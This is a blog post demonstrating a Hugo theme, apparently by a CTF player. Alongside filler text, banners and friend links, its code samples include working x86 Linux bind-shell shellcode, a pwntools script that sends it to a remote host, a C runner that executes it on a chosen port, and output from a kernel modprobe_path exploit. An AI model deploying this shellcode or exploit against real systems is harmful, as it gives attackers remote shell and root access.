# Init New World


# <font color=red>Refreshed by X1do0</font>

prelude of ~~the new theme demo~~ babble

<!--more-->

## Loop free

Cuz it's hard for me, I will find only time will tell I will figure out. 

### lbwnb

waf `waf`

### 「lbwnb」

gang **gang** 


## aka

> asdknas



```python
from pwn import *
sc= b"\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x56\x89\xe1\xcd\x80\x89\xc6\x31\xc9\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf2\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";

io = remote("rookie_s**t", 123)
io.sendline(sc)
io.interactive()
```

```c
#include <stdio.h>
#include <stdlib.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x56\x89\xe1\xcd\x80\x89\xc6\x31\xc9\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf2\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";

void main(int argc, char *argv[])
{

  /* Default port at 28th and 29th byte index: \x11\x5c */

  // in case no port is provided the default would be used
  if (argc < 2) {
    printf("No port provided, 4444 (0x115c will be used)\n");
  } 
  else
  {

    int port = atoi(argv[1]);
    printf("Binding to %d (0x%x)\n", port, port);

    unsigned int p1 = (port >> 8) & 0xff;
    unsigned int p2 = port & 0xff;
    // printf("%x %x\n", p1, p2);

    shellcode[28] = (unsigned char){p1};
    shellcode[29] = (unsigned char){p2};

    // printf("%x %x", shellcode[28], shellcode[29]);
}

  int (*ret)() = (int(*)())shellcode;

  ret(); 

}

```

```
/ $ /exp
[+] open ko, return 3
[*] try to read from kernel, return 320
[*] kernel base is ffffffff95200000
[*] Reg saved cs = 33, ss = 2b, flags = 206, user_sp = 7ffce5505978
[*] Prepared payload to overwrite modprobe_path
[*] Returned to userland, setting up for fake modprobe
[*] Run unknown file
/tmp/dummy: line 1: ����: not found
[*] Hopefully flag is readable
flag{TEST}
```

## kak

{{< admonition >}}
一个 **注意** 横幅
{{< /admonition >}}

{{< admonition abstract >}}
一个 **摘要** 横幅
{{< /admonition >}}

{{< admonition info >}}
一个 **信息** 横幅
{{< /admonition >}}

{{< admonition tip >}}
一个 **技巧** 横幅
{{< /admonition >}}

{{< admonition success >}}
一个 **成功** 横幅
{{< /admonition >}}

{{< admonition question >}}
一个 **问题** 横幅
{{< /admonition >}}

{{< admonition warning >}}
一个 **警告** 横幅
{{< /admonition >}}

{{< admonition failure >}}
一个 **失败** 横幅
{{< /admonition >}}

{{< admonition danger >}}
一个 **危险** 横幅
{{< /admonition >}}

{{< admonition bug >}}
一个 **Bug** 横幅
{{< /admonition >}}

{{< admonition example >}}
一个 **示例** 横幅
{{< /admonition >}}

{{< admonition quote >}}
一个 **引用** 横幅
{{< /admonition >}}


## 中文测试

别吵别吵别吵，你可能以为我在第一层，实际上我是1145141919810欧洗给欧洗给haoduoyinliugou好想做嘉然小姐的狗歪比巴卜两面包夹芝士看我一个空中劈叉飞龙骑脸怎么输A1高闪来一个秋梨膏异世相遇尽享美味777777若风一指若风一指吼吼吼全给党为你打calllllll李吼那么大声干甚么今生立誓以你为王吾王剑锋所指是我永恒不变的信仰欧拉欧拉木大木大你们有为roselia赌上一切的觉悟吗这一刻我充满了决心小朋友们大家好我是你们的好朋友金坷垃肥料资源不缺乏必须要有faq此生无悔入东方，来世愿为蓝蓝路先有老菊后有天太阳骑士日神仙哈喽大家好欢迎来到籽岷的minecraft游戏世界我从未见过如此厚颜无耻之人乌鸦坐飞机什么是快乐星球贵州和广西相比大家好，我叫张全蛋，我的英文名叫挖掘机技术哪家强，山东技校找烤面筋香香的滴口味你尝过没不如去问问神奇海螺吧欧巴刚弄死他我不是针对你我是说在座的所有人我卢本伟没有开挂基尼太美，林北66CCFF如果我有十点法力水晶我能在河边钓上一整天的杰哥不要awsl来房里有好康的可以教你蓝瘦香菇给力嗷铁子奥利给老铁双击666我爸是李刚两面包夹芝士我的头发乌黑浓乌鱼子乌鱼子乌鱼子乌鱼子绝绝子绝绝子绝绝子绝绝子这位更是重量级

## 友链测试

Thanks for your splendid theme, I mainly edited on [this](https://github.com/dillonzq/LoveIt/blob/master/README.zh-cn.md).

{{< friend name="Dillon" url="https://github.com/dillonzq/" logo="https://avatars0.githubusercontent.com/u/30786232?s=460&u=5fc878f67c869ce6628cf65121b8d73e1733f941&v=4" word="Author of the theme" >}}

Also, Banerya does make a difference by helping me debug my codes from remote devices during my blog migration. I have encontered some confusing problems about tty and woff on my website, which now turns out that my system configuration is to blame. Thanks for your patience, it really helps me a lot.

{{< friend name="Banerya" url="https://github.com/phyhac" logo="https://avatars.githubusercontent.com/u/48408390?v=4" word="Harbin Institute of Technology" >}}

More work needs to be done, currently I'm trying to move all of my blogs hitheto to here. So far so goooood...

{{< admonition warning >}}
施工中...
{{< /admonition >}}
